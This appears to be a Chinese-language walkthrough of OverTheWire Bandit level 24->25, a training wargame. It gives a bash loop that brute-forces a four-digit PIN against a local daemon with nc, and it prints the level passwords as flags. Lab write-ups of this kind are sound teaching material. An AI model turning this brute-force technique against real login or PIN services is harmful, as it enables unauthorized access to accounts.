# [Level 24 -> 25](http://overthewire.org/wargames/bandit/bandit25.html)

 暴力的 shell script。

## Level Goal

A daemon is listening on port 30002 and will give you the password for bandit25 if given the password for bandit24 and a secret numeric 4-digit pincode. There is no way to retrieve the pincode except by going through all of the 10000 combinations, called brute-forcing.

## Writeups

這題的提示很清楚，就是要用暴力破解的方式，一個一個試。但我們是要利用shell script 幫我們完成這件事。首先，創建一個的目錄，方便我們撰寫 script 及存放執行結果：

```shell
bandit24@melinda:~$ mkdir /tmp/bandit25script
bandit24@melinda:~$ cd /tmp/bandit25script
bandit24@melinda:/tmp/bandit25script$
```

撰寫```script.sh```：

```shell
#!/bin/bash

for pin in {0..9}{0..9}{0..9}{0..9}
    do
         echo "UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ $pin" | nc 127.0.0.1 30002 >> result.txt &
    done
```

開啟```script.sh```執行權限並執行：

```shell
bandit24@melinda:/tmp/bandit25script$ chmod 700 script.sh
bandit24@melinda:/tmp/bandit25script$ ./script.sh
```

最後利用```uniq```找出 Flag：

```shell
bandit24@melinda:/tmp/bandit25script$ sort result.txt | uniq -u

Correct!
The password of user bandit25 is uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG
```


找到了！Flag：```uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG```。

> [Next level（Level 25 -> 26）](https://github.com/YanHaoChen/OverTheWire-Writeups/blob/master/Bandit/Level24to25.md) 
